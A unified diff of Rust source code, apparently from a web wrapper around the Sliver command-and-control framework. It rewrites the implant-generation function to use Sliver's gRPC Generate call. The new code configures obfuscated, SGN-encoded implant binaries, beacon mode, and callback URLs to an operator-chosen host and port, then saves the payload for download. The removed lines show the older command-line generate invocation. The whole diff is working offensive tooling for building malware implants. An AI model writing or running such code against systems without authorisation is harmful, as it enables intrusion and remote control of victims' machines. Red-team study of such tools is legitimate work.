@@ -1,7 +1,7 @@
 use serde::{Deserialize, Serialize};
 
 use crate::sliver::connection::SliverConnection;
-use crate::sliver::proto::commonpb;
+use crate::sliver::proto::{clientpb, commonpb};
 
 /// A simplified implant build representation for API responses.
 #[derive(Debug, Clone, Serialize)]
@@ -71,7 +71,7 @@ pub struct GeneratePayloadRequest {
     pub lport: u16,
 }
 
-#[derive(Serialize)]
+#[derive(Debug, Serialize)]
 pub struct GenerateResponse {
     pub success: bool,
     pub message: String,
@@ -79,108 +79,80 @@ pub struct GenerateResponse {
     pub output_path: Option<String>,
 }
 
-/// Generate an implant via sliver-server --rc (actually compiles, just slow first time).
-/// Does NOT need a SliverConnection — spawns sliver-server as child process.
+/// Generate an implant via Sliver gRPC `Generate` RPC.
+/// Now with `HTTPC2ConfigName: "default"` to avoid "record not found".
 pub async fn generate_implant(
+    conn: &mut SliverConnection,
     req: GeneratePayloadRequest,
 ) -> GenerateResponse {
-    let proto = match req.protocol.as_str() {
-        "mtls" => format!("--mtls {}:{}", req.lhost, req.lport),
-        "http" => format!("--http {}:{}", req.lhost, req.lport),
-        "https" => format!("--https {}:{}", req.lhost, req.lport),
-        "dns" => format!("--dns {}:{}", req.lhost, req.lport),
-        _ => format!("--mtls {}:{}", req.lhost, req.lport),
+    let c2_url = format!("{}://{}:{}", req.protocol, req.lhost, req.lport);
+    let format = match req.format.as_str() {
+        "shared" => clientpb::OutputFormat::SharedLib,
+        "shellcode" => clientpb::OutputFormat::Shellcode,
+        "service" => clientpb::OutputFormat::Service,
+        _ => clientpb::OutputFormat::Executable,
     };
-    let beacon = if req.is_beacon { " --beacon" } else { "" };
 
-    let save_dir = std::env::current_dir().unwrap_or_default().join("payloads");
-    let save_str = save_dir.to_string_lossy().to_string();
-    std::fs::create_dir_all(&save_dir).ok();
+    let generate_req = clientpb::GenerateReq {
+        name: req.name.clone(),
+        config: Some(clientpb::ImplantConfig {
+            goos: req.goos.clone(),
+            goarch: req.goarch.clone(),
+            format: format.into(),
+            is_beacon: req.is_beacon,
+            debug: false,
+            obfuscate_symbols: true,
+            sgn_enabled: true,
+            include_http: req.protocol.starts_with("http"),
+            include_mtls: req.protocol == "mtls",
+            include_dns: req.protocol == "dns",
+            httpc2_config_name: "default".to_string(),  // ← FIX: use default HTTP C2 config
+            template_name: "sliver".to_string(),
+            c2: vec![clientpb::ImplantC2 {
+                url: c2_url,
+                priority: 1,
+                ..Default::default()
+            }],
+            reconnect_interval: 60,
+            max_connection_errors: 100,
+            ..Default::default()
+        }),
+    };
 
-    // RC command WITHOUT exit — server stays alive until compile finishes
-    let rc_cmd = format!(
-        "generate --name {} --os {} --arch {} --format {} {} {} --save {}\n",
-        req.name, req.goos, req.goarch, req.format, proto, beacon, save_str
-    );
+    match conn.client.generate(tonic::Request::new(generate_req)).await {
+        Ok(response) => {
+            let out = response.into_inner();
+            tracing::info!("Payload generated: {} (build_id: {})", out.implant_name, out.implant_build_id);
 
-    let bin_raw = std::env::var("SLIVER_SERVER_PATH")
-        .unwrap_or_else(|_| "sliver-server".to_string());
-    let parts: Vec<&str> = bin_raw.split_whitespace().collect();
-    let (bin_cmd, bin_args) = parts.split_first().unwrap_or((&"sliver-server", &[]));
+            // Save binary to ./payloads for download
+            let mut dl_path = None;
+            if let Some(file) = out.file {
+                let save_dir = std::env::current_dir().unwrap_or_default().join("payloads");
+                let _ = std::fs::create_dir_all(&save_dir);
+                let fpath = save_dir.join(&out.implant_name);
+                if std::fs::write(&fpath, &file.data).is_ok() {
+                    dl_path = Some(format!("/api/payloads/download/{}", out.implant_name));
+                    tracing::info!("Binary saved: {:?} ({} bytes)", fpath, file.data.len());
+                }
+            }
 
-    let rc_path = format!("/tmp/nw_rc_{}.txt", std::process::id());
-    let _ = std::fs::write(&rc_path, &rc_cmd);
-
-    let mut child = match tokio::process::Command::new(bin_cmd)
-        .args(bin_args)
-        .args(["--rc", &rc_path])
-        .stdout(std::process::Stdio::piped())
-        .stderr(std::process::Stdio::piped())
-        .spawn()
-    {
-        Ok(c) => { let _ = std::fs::remove_file(&rc_path); c }
+            GenerateResponse {
+                success: true,
+                message: format!("Payload '{}' generated", out.implant_name),
+                implant_name: Some(out.implant_name),
+                output_path: dl_path,
+            }
+        }
         Err(e) => {
-            let _ = std::fs::remove_file(&rc_path);
-            return GenerateResponse {
+            tracing::error!("Generate failed: {}", e);
+            GenerateResponse {
                 success: false,
-                message: format!("Failed to start sliver-server: {e}. Set SLIVER_SERVER_PATH"),
-                implant_name: None, output_path: None,
-            };
-        }
-    };
-
-    // Wait up to 10 min (first Go compile may be slow)
-    match tokio::time::timeout(std::time::Duration::from_secs(600), child.wait_with_output()).await {
-        Ok(Ok(output)) => {
-            if output.status.success() {
-                tracing::info!("sliver-server generate completed successfully");
-                // Poll for binary in save dir (up to 60s)
-                let dl = poll_save_dir(&req.name, &save_dir);
-                GenerateResponse {
-                    success: true,
-                    message: format!("Payload '{}' generated", req.name),
-                    implant_name: Some(req.name),
-                    output_path: dl.map(|f| format!("/api/payloads/download/{}", f)),
-                }
-            } else {
-                let stderr = String::from_utf8_lossy(&output.stderr);
-                let stdout = String::from_utf8_lossy(&output.stdout);
-                let combined = format!("{}{}", &stdout[..100.min(stdout.len())], &stderr[..200.min(stderr.len())]);
-                GenerateResponse {
-                    success: false,
-                    message: format!("sliver-server failed: {}", combined),
-                    implant_name: None, output_path: None,
-                }
+                message: format!("Generate failed: {}", e),
+                implant_name: None,
+                output_path: None,
             }
         }
-        Ok(Err(e)) => GenerateResponse {
-            success: false, message: format!("Process error: {e}"),
-            implant_name: None, output_path: None,
-        },
-        Err(_) => GenerateResponse {
-            success: false, message: "Payload generation timed out (10 min)".into(),
-            implant_name: None, output_path: None,
-        },
     }
-}
-
-/// Scan save directory for binary with matching name (up to 60s).
-fn poll_save_dir(name: &str, dir: &std::path::Path) -> Option<String> {
-    let start = std::time::Instant::now();
-    while start.elapsed().as_secs() < 60 {
-        if let Ok(entries) = std::fs::read_dir(dir) {
-            for e in entries.flatten() {
-                let fname = e.file_name().to_string_lossy().to_string();
-                if (fname.contains(name) || fname == name)
-                    && e.metadata().map(|m| m.is_file() && m.len() > 0).unwrap_or(false)
-                {
-                    return Some(fname);
-                }
-            }
-        }
-        std::thread::sleep(std::time::Duration::from_secs(2));
-    }
-    None
 }
 
 /// Search for the generated binary in the save dir, returning the filename.
